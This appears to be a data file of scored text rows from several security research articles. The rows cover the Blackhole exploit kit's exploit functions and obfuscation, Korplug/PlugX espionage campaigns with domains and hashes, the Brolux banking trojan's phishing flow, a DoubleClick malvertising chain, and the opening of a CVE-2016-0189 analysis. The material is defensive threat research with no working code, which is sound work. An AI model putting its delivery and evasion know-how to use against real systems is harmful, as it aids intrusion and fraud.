This exploit function delivered the same Java exploits as spl0, though not the same ones at the same time. From version 1.2.2 onwards it has been completely absent from the scripts – not even an empty skeleton was left in the call chain.",0.007974504770031698
"spl2: MDAC exploit MS06-014
This exploit function used a version of the classic VBScript downloader method that was very popular among script downloaders some 10 years ago. The only improvement over those old-timers is the access to the shell object, which instead of the CreateObject method makes use of some exploitable ActiveX objects.
The XMLHTTP object is utilized to download the file and the ADODB.Stream to save it to a local file. Then the exploited object is used to run the saved executable, as shown in Figure 4.
Figure 4. MS06-014 downloader.",0.009243102175418572
"spl3: PDF
This exploit function delivers the PDF exploits. The PluginDetect library is used to determine the version of the AdobeReader plug-in, and depending on the version, one of two possible PDF file generator PHP functions is called: the first for PDF versions below the main version 8, and the second for all 8.x PDF versions, and for all 9.x versions where x<=3. The decision logic is shown in Figure 5.
Figure 5. PDF delivery decision logic.
The show_pdf() function appends an additional HTML child element that contains the link to the PDF generator server-side PHP script. This appended element can either be an IFRAME or an object, depending on the OS and browser version (see Table 1a and Table 1b).
The first PDF is a compound in itself, serving four different exploits. Depending on the Adobe Reader version, the following exploit codes are delivered [2]:
All major versions 9 and for major version 8 until 8.12: CVE-2008-2992 (Collab.getIcon)
All major versions 6 and for major version 7 before 7.11: CVE-2007-5659 (Collab.collectEmailInfo)
Version 7.1: CVE-2008-2992 (util.printf)
Versions between 8.12 and 8.2 (boundaries not included): CVE-2009-4324 (media.newPlayer).
The second PDF delivers only one exploit, CVE-2010-0188 (libtiff). The obfuscation of both of the PDF types is the same; it is sufficient to examine only one of them, which will be CVE-2010-0188.
The main script code is stored as data and distributed along the various PDF fields (Author, Subject, Keyword, Creator, Producer), with the hex-encoded shellcode being separate in the Title field.
Figure 6. Encrypted main script is stored in PDF fields.
The encoded main body is decoded by a simple decode script stored in the PDF which results in a script that uses the common heap-spray technique and builds the shellcode from the content of the Title field of the PDF.
Figure 7. Heap spray and shellcode builder.
(To view a larger version of Figure 7 click here.)
The shellcode itself is nothing special; it is the usual boring downloader code that we have seen in web attacks many times over. The Windows API names are looked up by the usual ror 0x0d encoded checksums.
Figure 8. The traditional shellcode.
This shellcode is the same in all exploit functions, the only difference is that while in most cases it is XORed with 0x28 and the code starts with a short decryptor, in the cases of the PDF libtiff exploit and the HCP exploit, the XOR layer is missing from the top of the shellcode.",0.015572064413296949
"spl4: Windows Help and Support Center Vulnerability
This exploit function delivers the exploit for vulnerability CVE-2010-1885. It is used in two forms. In some cases the script is only linked into the mainfile script, in other cases the downloader script is actually embedded into it. Which is actually selected depends on the OS and browser version (see Table 1a and Table 1b).
Figure 9. Directly embedded downloader code.
In either case, the downloader code is the classical XMLHTTP+ADODB downloader, which does not need to use the MDAC exploit.
Figure 10. Decoded downloader code.",0.01034200468600821
"pl5: Flash CVE-2011-0611
This exploit function delivers the CVE-2011-0611 Adobe Flash vulnerability in multiple stages, using two SWF files. The components are shown in Figure 11.
Figure 11. The mainfile fragment of the SWF attack.
The stage 1 component allocates and fills large enough memory buffers in order to make the preparations for the second stage.
This SWF file (field.swf) utilizes the ExternalInterface class of the ActionScript language that allows the code running in the SWF file to communicate with the embedding container – which in this case is the mainfile script. The communication in this case consists of calling the getAllocSize, getBlockSize, etc. functions, then getCN, which loads the second stage SWF.
Figure 12. ExternalInterface function calls in stage 1 SWF.
(To view a larger version of Figure 12 click here.)
The second stage file (score.swf) drops an SWF file that calls getShellCode() to get the shellcode. This shellcode is then invoked by the conditions set by the heap spray.
Figure 13. Calling getShellCode from the second SWF component.",0.011119405696035867
"spl6: Flash CVE-2011-2110
This exploit code has recently been added (from v. 1.2.4) to the Blackhole menu. The function embeds an SWF file as an object into the mainfile response page.
Figure 14. Spl6 in the mainfile script.
(To view a larger version of Figure 14 click here.)
The loaded SWF file has an ActionScript downloader script which will connect back to download the binary payload.
Figure 15. The decompiled ActionScript code.
(To view a larger version of Figure 15 click here.)",0.009335485126460985
"spl7: XML Core Services – CVE-2012-1889
This exploit function is interesting in that it sheds some light on the development practice of an exploit author. The exploit was apparently used in targeted attacks as early as March 2012. At least some live samples popped up using it on the popular website analysis tool, jsunpack.jeek.org. The first public appearance of the code was on 24 May on Chinese website baidu.com. From this point, events unfolded rapidly. Microsoft published an advisory on 12 June. Four days later, support for the vulnerability was added to the Metasploit framework. At around the same time, the Blackhole author was interviewed and confirmed that support for the vulnerability would be added to Blackhole soon. Finally, on 22 June, version 1.2.5 was released including this exploit.
Figure 16. Timeline of CVE-2012-1889.
The timeline of this particular exploit suggests that the support was added in haste. Looking at the result, one can see immediately that this code is a distinct block in the server code: the coding style is not integrated into the general style of the mainfile script. Not even the indentation conforms to the standards (i.e. no indentation, no unnecessary whitespaces) of the mainfile script.
Figure 17. CVE-2012-1889 code in Blackhole.
(To view a larger version of Figure 17 click here.)
If we compare the added code with the most authentic source we know of – that published in May on baidu.com – it is easy to see that the code was copy-pasted into Blackhole. The function order, the variable names, the indentation, the constants – in short, everything is an exact copy of that code.
Figure 18. The genuine CVE-2012-1889 code from China.
The major difference is the shellcode, which is the standard used in all other exploit functions, this time not XOR encrypted.
Evidently, support for this exploit was added to the kit in a hurry – more as a PR move to prove that the author could react quickly, than as a real improvement. In fact, the author must have been convinced of the rather limited use of his enhancement, because in the field only a handful of cases were observed in which this exploit was turned on. In the vast majority of the cases this exploit function remained empty.",0.017425006051413283
"NOJS: Java – CVE-2010-0840
This part of the mainfile response page works without JavaScript support. It loads a Java archive, which receives the encrypted URL as a parameter. The encryption is a simple replacement cypher, using a randomly swapped alphabet string as the replacement key.
Figure 19. URL obfuscation in Java downloader.
The Java downloaders use different levels of obfuscation. In the simplest cases the strings are only reversed, broken up into smaller chunks, or encrypted.
Figure 20. Simple string obfuscations in Blackhole Java components.
(To view a larger version of Figure 20 click here.)
There were also more complex cases when the obfuscation was solved with the Zelix KlassMaster professional Java protection tool [4].
Zelix KlassMaster (ZKM) is an efficient tool that makes analysis very complicated, hiding the string constants from the decompilation output. It is worth noting that the version of ZKM was 5.4.3 in all of the observed Blackhole-related files. The author didn’t care to upgrade to the currently available 5.5.0 version.
The usage of ZKM is not exclusive – in other class files the code is left readable, only the string constants are obfuscated with simple methods.",0.01417855142065283
"Why Java?
When I started the analysis of the Blackhole server-side code, I had a couple of questions in mind (needless to say, the number of questions multiplied with each day). The very first question came when I looked at the exploit distribution statistics available from a few Blackhole back-ends. All had the same characteristics that are shown in Figure 21: an overwhelming dominance of Java exploitations.
Figure 21. Exploit deliverance stats.
In each of them, Java exploits proved to be the most effective infection vectors – always by a large margin. I had a couple of ideas as to the possible reason for this phenomenon:
The mainfile logic is skewed and favours Java over the other vulnerabilities – it serves the others only if Java distribution fails.
The mainfile is bogus, and if some exploit function crashes, the rest will not have a chance to activate – whereas the NOJS Java component always executes.
The downloadfile logic does not count subsequent download attempts after the first one (which is usually the NOJS Java that does not need time-consuming decryption) hits the server.
After evaluating the code, it turned out that none of my hypotheses were true. The Blackhole exploit kit doesn’t favour any of the individual exploit functions. At this point, running out of ideas, I had to follow the advice of Sir Arthur Conan Doyle's detective Sherlock Holmes: ‘Once you eliminate the impossible, whatever remains, no matter how improbable, must be the truth.’
So after eliminating the above hypotheses, I was left with the following, however ridiculous it sounds: the Java security fixes are not installed on the end-users’ computers. Users don’t consider Java to be an immediate threat, and consequently don’t rush to update their systems. And that is the biggest security challenge regarding web threats. We need to make users aware that, right now, Java is the weakest spot – and it is heavily under attack.",0.01458581045368168
"Version 2.0
This research was about to finish when a new major version of Blackhole (2.0) was released. This paper will not cover that version in detail, however it deserves at least a brief mention.
The most important new features of this version are [7] (as claimed by the author):
Direct download of executable payloads is prevented.
Exploit contents are only loaded when the client is considered vulnerable.
Use of the PluginDetect library in Java versioning has been dropped (reducing the necessary code size significantly).
Some old exploits have been removed (leaving Java atomic and byte, PDF LibTIFF, MDAC).
The predictable URL structure has been changed (filenames and querystring parameter names).
Machine stats have been updated to include Windows 8 and mobile devices.
A better breakdown of plug-in version information is provided.
The checking of the referrer has been improved.
TOR traffic is blocked.
A self-learning mode is available for blacklisting (outside of distribution campaigns, all downloads could be considered from security researchers, thus blacklisted).
The URL structure of versions 1.x was indeed very predictable, allowing URL-filtering products to block infection attempts easily. This has been changed, the query parameter names are now random, and the values are obfuscated.
The mainfile response script starts with the attenuated PluginDetect code, which contains only the Adobe Reader versioning.
That is followed by the individual exploit functions – and there are not many of them left, only PDF and MS06-014 were observed, with the additional NOJS Java downloader.
The exploit functions are not chained one after the other, instead they follow each other in separate try{} constructs.
Figure 22. Blackhole v2.0 code.
(To view a larger version of Figure 22 click here.)",0.013798853524956689
"Payloads
At some point, usually around the end of an analysis, we have to ask ourselves: what for? What is the likely objective of the Blackhole distribution campaigns? It can be best understood by inspecting the downloaded executable payloads, because from the point of view of the infection process, that component is the final destination.
The chart in Figure 23 breaks down the payloads observed over a two-month period (August and September 2012) into major categories.
Figure 23. Payload breakdown.
It clearly shows the motivation of the purchasers of Blackhole: financial gain. The largest chunk of the distributed payload samples either collect money directly (FakeAV, Ransomware), steal information to gain money (ZBot, password stealers), or take part in click fraud (ZeroAccess). The rest are backdoors and downloaders that facilitate the attacks.
The sole purpose of Blackhole operators is to make money – which shouldn’t come as a surprise. Nevertheless, the above chart explains the large number of ongoing complaints about fake AV and ransomware infections. Nothing personal, it’s just about the money.",0.014252656617854131
"Bibliography
[1] http://www.virusbtn.com/virusbulletin/archive/2012/10/vb201210-Blackhole.
[2] http://nakedsecurity.sophos.com/exploring-the-blackhole-exploit-kit.
[3] http://www.pinlady.net/PluginDetect.
[4] http://www.zelix.com/klassmaster/index.html.
[5] http://blog.unmaskparasites.com/2011/03/24/blackhole-defs_colors-and-createcss-injections.
[6] http://malware.dontneedcoffee.com/2012/10/neosploit-now-showing-bh-ek-20-like.html.
[7] http://nakedsecurity.sophos.com/2012/09/13/new-version-of-blackhole-exploit-kit.
",0.01067301885957106
"Korplug military targeted attacks: Afghanistan & Tajikistan
After taking a look at recent Korplug (PlugX) detections, we identified two larger scale campaigns employing this well-known Remote Access Trojan. This blog gives an overview of the first one",0.011905163680952291
12 Nov 2014 - 03:17PM,0.010975192139985324
"After taking a look at recent Korplug (PlugX) detections, we identified two larger scale campaigns employing this well-known Remote Access Trojan. This blog gives an overview of the first one",0.01076261386469557
"After taking a look at recent Korplug (PlugX) detections, we identified two larger scale campaigns employing this well-known Remote Access Trojan. This blog gives an overview of the first one, related to Afghanistan & Tajikistan. The other campaign, where the targets were a number of high-profile organizations in Russia, will be the subject of Anton Cherepanov’s presentation at the ZeroNights security conference in Moscow this week.",0.009842994457278986
"Sometimes malware used in various attacks is unique enough to identify related incidents, which makes tracking individual botnets simpler. An example is the BlackEnergy Lite variant (also known as BlackEnergy 3) used by a group of attackers (that was then given the name Quedagh, or Sandworm) against targets in Ukraine and other countries. BlackEnergy Lite is clearly distinguishable from the numerous binaries of the more common BlackEnergy 2 also circulating in-the-wild.",0.020953425292042027
"In other cases, attackers use more common tools for accomplishing their criminal goals. For example, the Korplug RAT (a.k.a .PlugX) is a well-known toolkit associated with Chinese APT groups and used in a large number of targeted attacks since 2012. For the past several weeks we have taken a closer look at a great number of detections of this malware in many unrelated incidents.",0.01521969397964662
"Among these, we were able to discover several successful infections where the employed Korplug samples were connecting to the same C&C domain.",0.012280023733588608
"DOMAIN: www.notebookhk.net
Updated Date: 2013-11-12 18:03:45
Create Date: 2013-06-18 11:08:17
Registrant Name: lee stan
Registrant Organization: lee stan
Registrant Street: xianggangdiqu
Registrant City: xianggangdiqu
Registrant State: xianggang
Registrant Postal Code: 796373
Registrant Country: HK
Registrant Phone : +0.04375094543
Registrant Fax: +0.04375094543
Registrant Email:stanlee@gmail.com",0.02500190709086414
Other Korplug samples were connecting to a different domain name resolving to the same IPs as notebookhk.net:,0.009837916114571965
"DOMAIN: www.dicemention.com
Updated Date: 2013-11-12 18:05:33
Create Date: 2013-09-10 14:35:11
Registrant Name: z x
Registrant Organization: z x
Registrant Street: xianggangdiqu
Registrant City: xianggangdiqu
Registrant State: xianggang
Registrant Postal Code: 123456
Registrant Country: HK
Registrant Phone : +0.0126324313
Registrant Fax: +0.0126324313
Registrant Email: 123@123.com",0.02276875959316771
"DOMAIN: www.abudlrasul.com
Updated Date: 2014-10-16 14:16:27
Create Date: 2014-10-16 14:16:27
Registrant Name: gang xin
Registrant Organization: gang xin
Registrant Street: Argentina Argentina
Registrant City: Argentina
Registrant State: Argentina
Registrant Postal Code: 647902
Registrant Country: AR
Registrant Phone : +54.0899567089
Registrant Fax: +54.0899567089
Registrant Email: woffg89@yahoo.com",0.021073296993523782
"Taking these C&Cs as a starting point, we were able to locate a number of victims infected through various exploit-laden spear-phishing documents and cunningly-named archives.",0.012935295693166315
A table with a selection of RTF documents and RAR self-extracting archives with a .SCR extension is shown below:,0.010809702478031369
File nameEnglish translationSHA1,0.011029733635933292
Situation Report about Afghan.doc36119221826D0290BC23371B55A8C0E6A84718DD,0.009500282275434535
AGREEMENT BETWEENTHE NATO AND AFGHANISTAN ON THE STATUS OF NATO FORCES IN AFGHANISTAN.docA6642BC9F3425F0AB93D462002456BE231BB5646,0.02204191631486252
news.doc51CDC273B5638E06906BCB700335E288807744B5,0.009152869160919397
План деятельности соединений и воинских частей Приволжского региона на июль 2014 г.scrActivity plan for military units in the Volga region in July 2014EA6EE9EAB546FB9F93B75DCB650AF22A95486391,0.02770517920398108
телефонный　справочник　структуры МИД КР .scrTelephone directory of the Ministry of Foreign Affairs of the Kyrgyz RepublicD297DC7D29E42E8D37C951B0B11629051EEBE9C0,0.019815135507861625
О Центре социальной адаптации военнослужащих.scrAbout the Center for social adaptation of servicemen8E5E19EBE719EBF7F8BE4290931FFA173E658CB8,0.016777098336933638
Протокол встречи НГШ КНР.scrMeeting minutes of the General Staff of the PRC1F726E94B90034E7ABD148FE31EBA08774D1506F,0.019511900071622512
исправленный шаблон плана мероприятий.scrCorrected action plan templateA9C627AA09B8CC50A83FF2728A3978492AEB79D8,0.01620381868157017
Situation Report about Afghan.scrA9C627AA09B8CC50A83FF2728A3978492AEB79D8,0.010402496078071644
Военно-политическая обстановка в ИРА на04.10.2014.scrMilitary and political situation in Islamic Republic of Afghanistan (IRA) on 04.10.2014E32081C56F39EA14DFD1E449C28219D264D80B2F,0.022320764691337036
Afghan Air Force.scrE32081C56F39EA14DFD1E449C28219D264D80B2F,0.009163854005685756
план мероприятий.scrAction plan1F726E94B90034E7ABD148FE31EBA08774D1506F,0.016130792276409678
Some of the above-mentioned files also contained decoy documents:,0.011020268423148849
"In all of the cases, three binary files were dropped (apart from decoy documents) that led to the Korplug trojan being loading into memory.",0.010437333018807338
"exe – a legitimate executable with a Kaspersky digital signature that would load a DLL with a specific file name
dll – a small DLL loader that would pass execution to the Korplug raw binary code
dll.avp – raw Korplug binary",0.011008857328630217
"The Korplug RAT is known to use this side-loading trick by abusing legitimate digitally signed executables and is a way to stay under the radar, since a trusted application with a valid signature among startup items is less likely to raise suspicion.",0.012974255384376132
"The maliciously crafted documents are RTF files that successfully exploit the CVE-2012-0158 vulnerability in Microsoft Word. The image below shows the beginning of the CVE-2012-0158 shellcode in ASCII encoding within the document (the opcodes 60, 55, 8bec disassemble to pusha; push ebp; mov ebp, esp).",0.0149967052918476
"Interestingly, though, the documents also contain the newer CVE-2014-1761 exploit that was extensively used in targeted attacks carried out by a number other malware families this year (including BlackEnergy, Sednit, MiniDuke, and others). However, this exploit is not implemented correctly due to a wrong file offset in the 1st stage shellcode.",0.0145025448503171
"Below we see the disassembly of the 1st stage shellcode where it checks the presence of the tag “p!11” marking the beginning of the 2nd stage shellcode and loads it into memory. Even though the tag and 2nd stage shellcode is present in the RTF, it’s at a different offset, and thus never is loaded.",0.012678153126769454
Sophos’ Gabor Szappanos gives a possible explanation how these malformed samples may have come into existence.,0.011821063164515366
ESET LiveGrid telemetry indicates that the attacks against these targets have been going on since at least June 2014 and continue through today.,0.020031413354452354
We were able to pinpoint the targets to residents of the following countries:,0.01205026502702311
"Afghanistan
Tajikistan
Russia
Kyrgyzstan
Kazakhstan",0.015270138038011805
"From the topics of the files used to spread the malware, as well as from the affected targets, it appears that the attackers are interested in gathering intelligence related to Afghan, Tajik and Russian military and diplomatic subjects.",0.013951031470261221
"Interestingly, most of the affected victims have another thing in common – a number of other RATs, file stealing trojans or keyloggers were detected on their systems on top of the Korplug RAT detection. One of these ‘alternative RATs’ was connecting to a domain also used by the Korplug samples.",0.011682126770808376
"Since the functionality of these tools was partly overlapping with that of Korplug, it left us wondering whether the attackers were just experimenting with different RATs or were they supplementing some functionality that they were unable to accomplish.",0.012928702021221428
Additional information about two malware families that were most often found accompanying Korplug infections is given below.,0.01319113213462153
Alternative Malware #1: DarkStRat,0.00894692104575412
"A curious Remote Access Trojan, as research points to a Chinese connection but the commands it listens to are in Spanish (translation in English):",0.009306493595023446
"CERRAR (close)
DESINSTALAR (uninstall)
SERVIDOR (server)
INFO
MAININFO
PING
REBOOT
POWEROFF
PROC
KILLPROC
VERUNIDADES (see units)
LISTARARCHIVOS (list files)
EXEC
DELFILE
DELFOLDER
RENAME
MKDIR
CAMBIOID (change ID)
GETFILE/SENDFILE/RESUMETRANSFER
SHELL
SERVICIOSLISTAR (list service)
INICIARSERVICIO (start service)
DETENERSERVICIO (stop service)
BORRARSERVICIO (erase service)
INSTALARSERVICIO (install service)",0.01626936476061802
"The malware can manage processes and services on the infected machine, transfer files to and from the C&C server, run shell commands, and so on. It is written in Delphi and connects to www.dicemention.com. Some samples contain a digital signature by “Nanning weiwu Technology co.,ltd”.",0.01004424024730044
Alternative Malware #2: File Stealer,0.008034783073466834
"This malware, written in C, and contains several functions for harvesting files off the victim’s hard drive according to criteria set in the configuration file. Apart from doing a recursive sweep of all logical fixed and remote drives, it also continually monitors any attached removable media or network shares by listening to DBT_DEVICEARRIVAL events.",0.011682076485280968
"In addition to collecting files, the malware attempts to gather saved passwords, history of visited URLs, account information and proxy information from the following applications:",0.01265467762654271
"Microsoft Messenger
Microsoft Outlook
Microsoft Internet Explorer
Mozilla Firefox",0.009994639368955505
The C&C domains used by this malware are:,0.010673163813560427
"newvinta.com
worksware.net",0.009529214280728504
"Some samples of this file stealer detected in these campaigns also contain the signature by “Nanning weiwu Technology co.,ltd” – another indicator that the infections are related.",0.014157609581273323
List of SHA1 hashes:,0.010090886974025048
Korplug:,0.006612968369026362
"5DFA79EB89B3A8DDBC55252BD330D04D285F9189
095550E3F0E5D24A59ADD9390E6E17120039355E
5D760403108BDCDCE5C22403387E89EDC2694860
05BFE122F207DF7806EB5E4CE69D3AEC26D74190
548577598A670FFD7770F01B8C8EEFF853C222C7
530D26A9BEEDCCED0C36C54C1BF3CDA28D2B6E62
F6CB6DB20AA8F17769095042790AEB60EECD58B0
EF17B7EC3111949CBDBDEB5E0E15BD2C6E90358F
17CA3BBDDEF164E6493F32C952002E34C55A74F2
973EA910EA3734E45FDE304F20AB6CF067456551
47D78FBFB2EFC3AB9DDC653A0F03D560D972BF67
0B5A7E49987EF2C320864CF205B7048F7032300D
E81E0F416752B336396294D24E639AE86D9C6BAA
E930D3A2E6B2FFDC7052D7E18F51BD5A765BDB90",0.030961232421339413
Alternative Malware #1:,0.008608153130789886
"FDD41EB3CBB631F38AC415347E25926E3E3F09B6
457F4FFA2FE1CACFEA53F8F5FF72C3FA61939CCD
5B6D654EB16FC84A212ACF7D5A05A8E8A642CE20
7D59B19BD56E1D2C742C39A2ABA9AC34F6BC58D4
D7D130B8CC9BEA51143F28820F08068521763494
01B4B92D5839ECF3130F5C69652295FE4F2DA0C5
02C38EC1C67098E1F6854D1125D3AED6268540DE",0.02075690731134794
Alternative Malware #2:,0.008195687949028252
"3A7FB6E819EEC52111693219E604239BD25629E9
BF77D0BA7F3E60B45BD0801979B12BEA703B227B
55EF67AFA2EC2F260B046A901868C48A76BC7B72
A29F64CD7B78E51D0C9FDFBDCBC57CED43A157B2
34754E8B410C9480E1ADFB31A4AA72419056B622
17A2F18C9CCAAA714FD31BE2DE0BC62B2C310D8F
6D99ACEA8323B8797560F7284607DB08ECA616D8
1884A05409C7EF877E0E1AAAEC6BB9D59E065D7C
1FC6FB0D35DCD0517C82ADAEF1A85FFE2AFAB4EE
5860C99E5065A414C91F51B9E8B779D10F40ADC4
7950D5B57FA651CA6FA9180E39B6E8CC1E65B746",0.025918684146309268
"Research by: Anton Cherepanov
",0.009586678714577856
"Brolux trojan targeting Japanese online bankers
A banking trojan, detected by ESET as Win32/Brolux.A, is targeting Japanese internet banking users and spreading through at least two vulnerabilities: a Flash vulnerability leaked in the Hacking Team hack and the so-called unicorn bug, a vulnerability in Internet Explorer.",0.014173917553464976
Jean-Ian Boutin,0.010129065139412474
Anton Cherepanov,0.012177145254436028
15 Oct 2015 - 11:49AM,0.01074538517625001
"A banking trojan, detected by ESET as Win32/Brolux.A, is targeting Japanese internet banking users and spreading through at least two vulnerabilities: a Flash vulnerability leaked in the Hacking Team hack and the so-called unicorn bug, a vulnerability in Internet Explorer.",0.012972781795331345
"A banking trojan, detected by ESET as Win32/Brolux.A, is targeting Japanese internet banking users and spreading through at least two vulnerabilities: a Flash vulnerability leaked in the Hacking Team hack and the so-called unicorn bug, a vulnerability in Internet Explorer discovered in late 2014. Both exploits are (still) distributed through an adult website and try to install a signed malicious binary designed to steal personal information from the victim. The spreading mechanism reminds us of another banking trojan specifically targeting Japanese financial institutions, Win32/Aibatook.",0.01027542497602818
Infection,0.006759407567450637
"When a user visits the malicious adult website, he is exposed to an exploit targeting either Internet Explorer (CVE-2014-6332) or Flash Player (CVE-2015-5119). The cybercriminals are thus using two widely known, weaponized vulnerabilities. This is yet another reminder that software we routinely used should always be kept up-to-date and patched. A proof-of-concept code for the vulnerability affecting Internet Explorer has been available for quite some time; this campaign is reusing a slightly modified version of it.",0.009888301217273576
"As for the Flash vulnerability, a working exploit was released publicly earlier this year during the analysis of the Hacking Team leak. Although these vulnerabilities have already been included in major exploit kits, we do not believe that any known exploit kit is used in this campaign. The exploit itself was easy to analyze as no additional obfuscation layer was added, as is customary with exploits used in popular exploit kits. As can be seen in the screenshot below, it appears the adult website attempting to compromise users is in fact just scraping videos from another, legitimate, adult website.",0.010416074522359042
Target,0.008390118765377541
"The main payload will download two configuration files. The first one contains a list of 88 Japanese internet banking URLs that are monitored by the trojan, while the second contains the accompanying browser window names. Win32/Brolux.A is a simple trojan monitoring whether the user is visiting one of the targeted Japanese internet banking websites. It supports Internet Explorer, Firefox and Chrome browsers. If the user is browsing the web with IE, Win32/Brolux.A will fetch the current URL in the address bar and then compare it to the list in the first configuration file. If Firefox or Chrome is used, it will instead compare the window’s title with the list obtained in the second configuration file. If there is a match, it will spawn a new IE process, pointing to a phishing page.",0.01314955646926208
"The phishing page asks for login information, as well as answers to security questions. The page tries to use two trusted institutions in Japan: the Public Prosecutors Office and the Financial Services Agency (FSA). The URL mimics both institutions while the page’s content refer to the FSA.",0.016124668583735957
Rough translation:,0.009204627515710051
"Please pay attention to crimes aimed at domestic internet banking!
Security measures that customers should implement:
In order to protect the important personal property of customers, Financial Services Agency will make each bank enhance its security.",0.016413944654470658
"Each bank will be required to provide customers with an updated card, and to submit information necessary to identify the customer uniquely.",0.01602179153499217
Rough translation:,0.009204627515710051
"Please pay attention to crimes aimed at domestic internet banking!
For each bank, there are some cases where answers to the questions below are not required.
In case there is no passphrase, please ignore and click ‘Next’ button to move to the next field!",0.017752453972519677
Rough translation:,0.009204627515710051
Personal information:,0.008450976976108304
"Registration number
Passphrases
Mail address
Mail password
The second PIN",0.010936714550162208
"We will not use personal credit data offered from Consumer Data Industry or sensitive information, which is defined by guideline for personal information protection, 2004 Financial Services Agency Notification No. 67, for purposes other than the original intent, which is limited by Ordinance for Enforcement of the Banking Act.",0.018273901035119722
"Interestingly, both the Public Prosecutors Office and the FSA issued statements about this kind of abuse.",0.016569883211357994
The Chinese connection,0.0073197569268290685
"The sample of Win32/Brolux.A we analyzed uses a Chinese mutex name. Also, the phishing page contained errors and was not entirely written in Japanese: two fields in the third phishing page shown above are written in Chinese.",0.012031172239909793
"Finally, the analyzed Win32/Brolux.A sample was signed with the following certificate:",0.011553650473720256
"Interestingly, this certificate, awarded to a Chinese company, has been used in the past to sign different Potentially Unwanted Applications and malware samples. Analyzing the different samples, some of them stand out. We found samples of Venik malware targeting Korean banks. This malware changes the host file on the victim’s computer to redirect requests for targeted Korean internet banking website to a phishing page. Incidentally, this modus operandi is quite similar to Win32/Brolux’s.",0.015430049046158856
"While Win32/Brolux uses simple techniques, it is a reminder for us all to take some precautionary measures to prevent threats like these from causing harm. First of all, Win32/Brolux is using old exploits to spread, so keeping the software running on your computer up-to-date and patched is a must. Then, being suspicious when your internet banking websites suddenly contain new content is a good safeguard against this type of attack.",0.010254976523051296
Indicator of Compromise,0.008028788776266227
IndicatorValue,0.008896553815385011
Certificate thumbprint88 ca 78 5c e6 ef 05 ac e6 de 58 46 86 86 29 cc d0 1b cd 40,0.010179084997395615
Win32/Brolux.A SHA10010d0ae9c56e222c9e90d3ef7dd9a215ca1780d,0.009384411766597989
Flash Exploit SHA1a646997f716f7af7a734a5148827431d6233101e,0.007520402900926704
Venik SHA1 (signed by same certificate)41188c1c88f24879745ae4649e0af37f9a47d20c,0.009690564294248638
Venik SHA1 (signed by same certificate)73F1B8D4650AEC0F60C6C243B8AC68805830460E,0.01030882987816606
Malicious domaindmmm.jp,0.009803591109002974
Phishing pagefas-go-jp-security.kensatsutyo.com,0.013031846727965979
"Domain hosting configuration filesluxurybro.co.kr
",0.008801015264088163
"Google’s DoubleClick ad network abused once again in malvertising attacks
Last week we uncovered a large-scale malvertising attack involving Google’s DoubleClick and Zedo that affected many high-profile sites.
Unfortunately, another incident where DoubleClick is part of the advertising chain has happened again.
Upon our discovery we immediately notified Google so they could shut this down.
Although DoubleClick is not directly responsible, the publisher is trusting them to only allow ‘clean’ ads.
Many popular sites were caught in the cross-fire including examiner . com. The power of malvertising attacks is that they can be widespread in an instant by leveraging the advertising networks’ infrastructure.
Malicious ads are displayed to millions of visitors who do not actually need to click them to get infected.
Attack overview:",0.012960304562106728
Traffic capture:,0.008507536393458581
"Redirection flow:
This slideshow requires JavaScript.
Flash-based redirection:",0.00827806600458636
"This ad looks legit but hides a silent redirection to an exploit page. Once again, no user interaction is required to trigger the redirection and anyone running an outdated Flash plugin is at risk of getting exploited.
I used Sulo to decrypt the malicious redirection that is hiding deep inside the Flash advert:",0.011309088038321535
"Flash Exploit Kit:
We discussed this landing-less exploit kit a week ago (‘Flash EK’ skips landing page, goes Flash all the way) and this one follows the same pattern. The first SWF file is used for redirection while the second one attempts the exploit (CVE-2014-0515).
Malwarebytes Anti-Exploit blocks this attack:",0.016981357375816963
"Payload:
The payload comes from hxxp://adservertrck.com/vinaudit/load0515p6jse9.php",0.008609344826313592
"It is the infamous CryptoWall (hat tip @kafeine) ransomware that encrypts your files and demands a ransom.
Closing notes:
Last week I attended the Virus Bulletin conference in Seattle and one of the talks was about leveraging ad networks to distribute exploits. In the paper titled “Optimized mal-ops. Hack the ad network like a boss“, the authors declared “Although we haven’t yet seen malicious banners that incorporate a fully functional exploit kit, it is a possibility, especially considering the targeted character of web ads.”
This latest example shows how the lines between malvertising and exploit kits are getting blurry. The bad guys might already be there.
@jeromesegura
",0.012493276515126106
The journey and evolution of God Mode in 2016: CVE-2016-0189,0.007480577922896137
Ankit Anubhav & Manish Sardiwal,0.012965854431258084
"FireEye, India",0.009302468941130626
Copyright © 2017 Virus Bulletin,0.01004035859515584
"Table of contents
Introduction God Mode CVE-2016-0189 God Mode bug: root cause analysis God Mode 101 Difference between 2016-0189 and 2014-6332 God Modes CVE 2016-0189 in action ValueOf method override Inside the custom 'exploit' function Using GetAddress to invoke overridden ValueOf Inside triggerBug Overwriting the Safe Mode flag CVE-2016-0189 VBScript God Mode memory corruption 'in the wild' Variant 1: OffensiveWare generated 2016-0189 Adoption in exploit kits Variant 2: Gongda exploit kit – PowerShell coupled with BITSAdmin to avoid behavioural detection Variant 3: 2016-0189 in RIG exploit kit Conclusion References Appendix",0.011278652688543667
Introduction,0.012036720276026314
"'The survival of the fittest' applies in a large variety of fields. In cybersecurity it not only applies to detection mechanisms but also to the attackers, as they continuously need to update their arsenal and find more successful ways to attack. Here, 'more successful' does not necessarily mean more complicated, but may mean an attack which is reliable, modular and cheap, especially in cases where the attacker is not well sponsored.",0.016334693888071405
"In 2016 we saw the continuation of a general shift in the most commonly used attack vectors from exploits in browsers and plug‑ins to Office macros, with macros becoming the predominant carrier mechanism of threats including data exfiltration malware and ransomware.",0.013626544813035713
"Hence for a browser exploit to stay relevant, it not only has to compete against other exploits, but also against macros, zipped standalone JavaScript (as an email attachment), and other malware delivery mechanisms. A present-day exploit must be both reliable and sufficiently straightforward to be used by attackers who don't have an in-depth understanding of exploits. Once an exploit overcomes the challenges related to reliability and complexity, it holds an edge over macros in that it doesn't require any social engineering to be activated, as macros do.",0.009177141362044283
"Exploits for the CVE-2016-0189 vulnerability offer reliability, and with a working proof of concept that has decreased the effort required to fork new variants, it is little wonder that amongst the unique file hashes of exploits seen in 2016 (excluding those running on Android/Linux), CVE‑2016-0189 was the most commonly exploited vulnerability:",0.012776740209684778
"Reliability
– One of the reasons why so few exploits are used in the wild is their low reliability when it comes to executing on the victim machine, since many of them are version-dependent (unlike macros which usually run on a variety of
MS Office
versions). The CVE‑2016‑0189 vulnerability exists in different versions of
Internet Explorer
, from
IE9
to
IE11
.",0.017381744073201588
"Complexity
– The proof-of-concept exploit for CVE‑2016-0189 released by Theori [
1
